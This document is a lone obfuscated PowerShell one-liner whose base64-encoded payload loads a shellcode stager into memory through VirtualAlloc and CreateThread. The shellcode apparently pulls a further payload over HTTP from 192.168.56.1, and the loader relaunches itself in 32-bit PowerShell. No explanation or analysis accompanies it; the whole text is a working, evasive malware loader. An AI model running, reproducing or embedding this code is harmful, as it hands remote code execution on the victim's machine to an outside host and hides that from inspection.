powershell -w 1 -C "sv P -;sv B ec;sv Ap ((gv P).value.toString()+(gv B).value.toString());powershell (gv Ap).value.toString() 'JABqAGQAIAA9ACAAJwAkAEkATQAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnACcAOwAkAFoAWAAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAEkATQAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4AYQBtAGUAcwBwAGEAYwBlACAAVwBpAG4AMwAyAEYAdQBuAGMAdABpAG8AbgBzACAALQBwAGEAcwBzAHQAaAByAHUAOwBbAEIAeQB0AGUAWwBdAF0AOwBbAEIAeQB0AGUAWwBdAF0AJABMAFEAIAA9ACAAMAB4AGYAYwAsADAAeABlADgALAAwAHgAOAAyACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADYAMAAsADAAeAA4ADkALAAwAHgAZQA1ACwAMAB4ADMAMQAsADAAeABjADAALAAwAHgANgA0ACwAMAB4ADgAYgAsADAAeAA1ADAALAAwAHgAMwAwACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMABjACwAMAB4ADgAYgAsADAAeAA1ADIALAAwAHgAMQA0ACwAMAB4ADgAYgAsADAAeAA3ADIALAAwAHgAMgA4ACwAMAB4ADAAZgAsADAAeABiADcALAAwAHgANABhACwAMAB4ADIANgAsADAAeAAzADEALAAwAHgAZgBmACwAMAB4AGEAYwAsADAAeAAzAGMALAAwAHgANgAxACwAMAB4ADcAYwAsADAAeAAwADIALAAwAHgAMgBjACwAMAB4ADIAMAAsADAAeABjADEALAAwAHgAYwBmACwAMAB4ADAAZAAsADAAeAAwADEALAAwAHgAYwA3ACwAMAB4AGUAMgAsADAAeABmADIALAAwAHgANQAyACwAMAB4ADUANwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEAMAAsADAAeAA4AGIALAAwAHgANABhACwAMAB4ADMAYwAsADAAeAA4AGIALAAwAHgANABjACwAMAB4ADEAMQAsADAAeAA3ADgALAAwAHgAZQAzACwAMAB4ADQAOAAsADAAeAAwADEALAAwAHgAZAAxACwAMAB4ADUAMQAsADAAeAA4AGIALAAwAHgANQA5ACwAMAB4ADIAMAAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAA0ADkALAAwAHgAMQA4ACwAMAB4AGUAMwAsADAAeAAzAGEALAAwAHgANAA5ACwAMAB4ADgAYgAsADAAeAAzADQALAAwAHgAOABiACwAMAB4ADAAMQAsADAAeABkADYALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQAwACwAMAB4ADcANQAsADAAeABmADYALAAwAHgAMAAzACwAMAB4ADcAZAAsADAAeABmADgALAAwAHgAMwBiACwAMAB4ADcAZAAsADAAeAAyADQALAAwAHgANwA1ACwAMAB4AGUANAAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwAsADAAeAA0AGIALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAxAGMALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgAMAA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAAwAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAZgAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQBiACwAMAB4ADgAZAAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADYAZQAsADAAeAA2ADUALAAwAHgANwA0ACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB4ADYAOQAsADAAeAA2AGUALAAwAHgANgA5ACwAMAB4ADUANAAsADAAeAA2ADgALAAwAHgANABjACwAMAB4ADcANwAsADAAeAAyADYALAAwAHgAMAA3ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAMwAxACwAMAB4AGQAYgAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADYAOAAsADAAeAAzAGEALAAwAHgANQA2ACwAMAB4ADcAOQAsADAAeABhADcALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADYAYQAsADAAeAAwADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA2ADgALAAwAHgAYgBiACwAMAB4ADAAMQAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4AGUAOAAsADAAeABiADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMgBmACwAMAB4ADUAOQAsADAAeAA1AGYALAAwAHgANwA5ACwAMAB4ADMAOAAsADAAeAA1ADQALAAwAHgANQAzACwAMAB4ADUANwAsADAAeAA1ADUALAAwAHgANQBmACwAMAB4ADYANwAsADAAeAA1ADYALAAwAHgANAA5ACwAMAB4ADQAMgAsADAAeAA2AGIALAAwAHgANgBiACwAMAB4ADQAOAAsADAAeAA0ADYALAAwAHgAMwA0ACwAMAB4ADQAMQAsADAAeAA2AGQALAAwAHgANwAzACwAMAB4ADUAMQAsADAAeAA1ADAALAAwAHgANABmACwAMAB4ADMANwAsADAAeAAzADEALAAwAHgANgAxACwAMAB4ADQAMQAsADAAeAA0ADYALAAwAHgAMAAwACwAMAB4ADUAMAAsADAAeAA2ADgALAAwAHgANQA3ACwAMAB4ADgAOQAsADAAeAA5AGYALAAwAHgAYwA2ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA5ACwAMAB4AGMANgAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAzADIALAAwAHgAZQA4ACwAMAB4ADgANAAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADcALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAZQBiACwAMAB4ADUANQAsADAAeAAyAGUALAAwAHgAMwBiACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQA2ACwAMAB4ADYAYQAsADAAeAAwAGEALAAwAHgANQBmACwAMAB4ADYAOAAsADAAeAA4ADAALAAwAHgAMwAzACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAOAA5ACwAMAB4AGUAMAAsADAAeAA2AGEALAAwAHgAMAA0ACwAMAB4ADUAMAAsADAAeAA2AGEALAAwAHgAMQBmACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgANwA1ACwAMAB4ADQANgAsADAAeAA5AGUALAAwAHgAOAA2ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAMgBkACwAMAB4ADAANgAsADAAeAAxADgALAAwAHgANwBiACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADUALAAwAHgAMQA2ACwAMAB4ADYAOAAsADAAeAA4ADgALAAwAHgAMQAzACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADQANAAsADAAeABmADAALAAwAHgAMwA1ACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADQAZgAsADAAeAA3ADUALAAwAHgAYwBkACwAMAB4ADYAOAAsADAAeABmADAALAAwAHgAYgA1ACwAMAB4AGEAMgAsADAAeAA1ADYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA2AGEALAAwAHgANAAwACwAMAB4ADYAOAAsADAAeAAwADAALAAwAHgAMQAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANAAwACwAMAB4ADAAMAAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADUAOAAsADAAeABhADQALAAwAHgANQAzACwAMAB4AGUANQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkAMwAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADgAOQAsADAAeABlADcALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADAALAAwAHgAMgAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANQAzACwAMAB4ADUANgAsADAAeAA2ADgALAAwAHgAMQAyACwAMAB4ADkANgAsADAAeAA4ADkALAAwAHgAZQAyACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAA1ACwAMAB4AGMAMAAsADAAeAA3ADQALAAwAHgAYwBkACwAMAB4ADgAYgAsADAAeAAwADcALAAwAHgAMAAxACwAMAB4AGMAMwAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADcANQAsADAAeABlADUALAAwAHgANQA4ACwAMAB4AGMAMwAsADAAeAA1AGYALAAwAHgAZQA4ACwAMAB4ADYAOQAsADAAeABmAGYALAAwAHgAZgBmACwAMAB4AGYAZgAsADAAeAAzADEALAAwAHgAMwA5ACwAMAB4ADMAMgAsADAAeAAyAGUALAAwAHgAMwAxACwAMAB4ADMANgAsADAAeAAzADgALAAwAHgAMgBlACwAMAB4ADMANQAsADAAeAAzADYALAAwAHgAMgBlACwAMAB4ADMAMQAsADAAeAAwADAAOwAkAFcARwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJABMAFEALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAB4ADEAMAAwADAAKQB7ACQAVwBHACAAPQAgACQATABRAC4ATABlAG4AZwB0AGgAfQA7ACQAWgBYAGEAPQAkAFoAWAA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAFcARwAsADAAeAA0ADAAKQA7AGYAbwByACAAKAAkAFIAbAA9ADAAOwAkAFIAbAAgAC0AbABlACAAKAAkAEwAUQAuAEwAZQBuAGcAdABoAC0AMQApADsAJABSAGwAKwArACkAIAB7ACQAWgBYADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAWgBYAGEALgBUAG8ASQBuAHQAMwAyACgAKQArACQAUgBsACkALAAgACQATABRAFsAJABSAGwAXQAsACAAMQApAH0AOwAkAFoAWAA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAWgBYAGEALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ACkAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAA2ADAAfQA7ACcAOwAkAFIAbABuACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAGoAZAApACkAOwAkAG0AQwAgAD0AIAAiAC0AZQBjACAAIgA7AGkAZgAoAFsASQBuAHQAUAB0AHIAXQA6ADoAUwBpAHoAZQAgAC0AZQBxACAAOAApAHsAJABzAE0AIAA9ACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAIAArACAAIgBcAHMAeQBzAHcAbwB3ADYANABcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsACIAOwBpAGUAeAAgACIAJgAgACQAcwBNACAAJABtAEMAIAAkAFIAbABuACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkAG0AQwAgACQAUgBsAG4AIgA7AH0A'"